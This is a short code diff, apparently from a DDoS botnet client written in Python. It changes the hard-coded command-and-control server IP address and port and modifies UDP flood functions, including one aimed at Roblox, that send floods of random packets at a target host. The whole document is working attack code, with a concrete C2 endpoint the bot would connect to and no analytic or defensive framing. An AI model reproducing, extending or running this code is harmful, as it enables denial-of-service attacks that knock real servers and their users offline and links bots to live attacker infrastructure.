@@ -9,8 +9,8 @@ import cloudscraper
 import requests
 import ctypes
 
-C2_ADDRESS = "147.185.221.18"
-C2_PORT = 48316
+C2_ADDRESS = "147.185.221.27"
+C2_PORT = 4887
 
 def attack_udp(ip, port, secs, size=65500):
     while time.time() < secs:
@@ -57,9 +57,8 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
-def attack_roblox(ip, port, secs, size):
+def attack_roblox(ip, port, secs, size=65400):
     while time.time() < secs:
-
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random._urandom(size)
         dport = random.randint(1, 65535) if port == 0 else port
